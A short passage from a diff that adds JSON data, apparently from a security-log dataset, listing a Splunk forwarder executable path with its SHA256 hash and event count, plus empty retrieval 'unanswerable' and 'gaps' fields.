+     "~ C:\\Program Files\\SplunkU…Forwarder\\bin\\splunk-powershell.exe: SHA256 211CC17F7C47B5CCF2B980A2091D392C73C9ABADDB1061CE419C5357DD5545C2, 50 events"
+    ]
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ }
+]
